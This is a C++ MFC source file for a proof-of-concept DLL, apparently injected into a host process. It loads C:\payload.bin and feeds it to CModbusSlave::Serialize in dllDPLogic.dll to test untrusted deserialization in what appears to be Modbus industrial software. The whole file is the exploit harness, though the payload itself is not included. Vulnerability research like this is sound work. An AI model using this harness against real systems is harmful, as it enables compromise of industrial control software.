#include <afx.h>
#include <afxwin.h>

#include <vector>

// dllDPLogic.dll 导出的目标类工厂函数签名。
typedef CRuntimeClass* (__stdcall* PGET_CLASS)();

extern "C" __declspec(dllexport) void RunPoc()
{
    // 确保注入的动态库调用时切换到正确的 MFC 模块状态。
    AFX_MANAGE_STATE(AfxGetStaticModuleState());

    // 验证流程固定读取路径。
    const wchar_t* kPayloadPath = L"C:\\payload.bin";
    CFile file;
    // 以二进制只读方式打开载荷文件。
    if (!file.Open(kPayloadPath, CFile::modeRead | CFile::typeBinary)) {
        AfxMessageBox(L"Failed to open C:\\payload.bin");
        return;
    }

    // 校验载荷大小，并限制为 UINT 可承载范围。
    ULONGLONG size = file.GetLength();
    if (size == 0 || size > MAXDWORD) {
        AfxMessageBox(L"Invalid payload size");
        file.Close();
        return;
    }

    // 将载荷读入连续缓冲区，供内存反序列化使用。
    std::vector<BYTE> buffer(static_cast<size_t>(size));
    UINT read = file.Read(buffer.data(), static_cast<UINT>(size));
    file.Close();
    if (read != static_cast<UINT>(size)) {
        AfxMessageBox(L"Failed to read payload");
        return;
    }

    // 用 MFC 的内存文件与归档包装缓冲区，准备反序列化。
    CMemFile memFile(buffer.data(), static_cast<UINT>(size));
    CArchive ar(&memFile, CArchive::load);

    // 获取包含 CModbusSlave 的模块句柄。
    HMODULE module = ::GetModuleHandleW(L"dllDPLogic.dll");
    if (!module) {
        AfxMessageBox(L"dllDPLogic.dll not loaded");
        return;
    }

    // 定位类工厂的修饰名导出符号。
    FARPROC proc = ::GetProcAddress(module, "?GetThisClass@CModbusSlave@@SGPAUCRuntimeClass@@XZ");
    if (!proc) {
        AfxMessageBox(L"CModbusSlave factory not found");
        return;
    }

    // 获取 CRuntimeClass 指针并创建实例。
    PGET_CLASS getClass = reinterpret_cast<PGET_CLASS>(proc);
    CRuntimeClass* runtimeClass = getClass ? getClass() : nullptr;
    if (!runtimeClass) {
        AfxMessageBox(L"CModbusSlave runtime class not available");
        return;
    }

    CObject* obj = runtimeClass->CreateObject();
    if (!obj) {
        AfxMessageBox(L"Failed to create CModbusSlave instance");
        return;
    }

    // 调用 Serialize，并用异常处理检测归档错误。
    bool ok = false;
    try {
        obj->Serialize(ar);
        ar.Close();
        ok = true;
    } catch (CException* e) {
        ar.Abort();
        e->Delete();
    }

    // 反序列化尝试结束后清理对象。
    delete obj;

    // 使用弹窗报告结果。
    if (ok) {
        AfxMessageBox(L"Success: Object Hydrated!");
    } else {
        AfxMessageBox(L"Archive Exception");
    }
}
